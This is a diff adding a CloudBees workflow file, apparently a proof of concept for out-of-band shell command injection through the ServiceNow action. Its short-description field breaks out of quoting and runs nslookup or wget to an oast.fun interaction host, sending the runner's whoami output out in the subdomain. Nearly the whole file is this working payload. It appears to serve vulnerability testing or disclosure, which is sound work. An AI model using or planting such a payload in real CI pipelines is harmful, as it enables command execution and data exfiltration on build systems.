@@ -1,0 +1,16 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: sn-oob-poc
+on:
+  push: { branches: [ main ] }
+  workflow_dispatch: {}
+jobs:
+  poc:
+    steps:
+      - uses: cloudbees-io/servicenow@v1
+        with:
+          action-type: 'create_change'
+          url: 'https://example.service-now.com'
+          username: 'u'
+          password: 'p'
+          short-description: "x'; nslookup \"sc.$(whoami).d9d252kjor348hmd7030i8xjpcatjjjd6.oast.fun\" || wget -qO- \"http://sc.$(whoami).d9d252kjor348hmd7030i8xjpcatjjjd6.oast.fun/\"; echo '"
